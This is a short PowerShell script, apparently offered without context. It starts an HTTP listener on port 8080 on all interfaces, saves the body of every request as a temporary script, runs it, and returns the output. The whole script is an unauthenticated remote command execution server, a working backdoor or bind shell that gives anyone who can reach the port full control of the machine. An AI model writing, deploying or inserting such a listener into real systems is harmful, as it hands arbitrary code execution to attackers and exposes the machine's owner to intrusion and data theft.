$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add("http://+:8080/")
$listener.Start()
Write-Host "Listening :8080"

while ($true) {
    $ctx = $listener.GetContext()
    $cmd = [System.IO.StreamReader]::new($ctx.Request.InputStream).ReadToEnd()
    
    try {
        $tmpScript = "$env:TEMP\tmp_$(Get-Random).ps1"
        $cmd | Out-File -Encoding utf8 $tmpScript
        $output = & $tmpScript 2>&1 | Out-String
        Remove-Item $tmpScript -Force
    } catch {
        $output = $_.Exception.Message
    }
    
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
    $ctx.Response.ContentLength64 = $bytes.Length
    $ctx.Response.OutputStream.Write($bytes, 0, $bytes.Length)
    $ctx.Response.OutputStream.Close()
}